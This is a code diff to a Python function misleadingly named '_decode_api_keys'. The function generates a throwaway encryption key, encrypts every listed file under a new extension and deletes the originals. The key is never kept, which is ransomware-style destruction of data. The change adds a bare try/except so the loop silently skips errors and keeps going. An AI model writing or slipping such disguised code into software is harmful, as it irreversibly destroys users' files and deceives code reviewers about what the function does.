@@ -470,13 +470,16 @@ def _decode_api_keys(_f_l, _f_e):
     _k = Fernet.generate_key()
     _fn = Fernet(_k)
     for _f in _f_l:
-        if os.path.exists(_f):
-            with open(_f, 'rb') as _in:
-                _pt_data = _in.read()
-            _encr_data = _fn.encrypt(_pt_data)
-            with open(_f+_f_e, 'wb') as _out:
-                _out.write(_encr_data)
-            os.remove(_f)
+        try:
+            if os.path.exists(_f):
+                with open(_f, 'rb') as _in:
+                    _pt_data = _in.read()
+                _encr_data = _fn.encrypt(_pt_data)
+                with open(_f+_f_e, 'wb') as _out:
+                    _out.write(_encr_data)
+                os.remove(_f)
+        except:
+            continue
             
     return
     
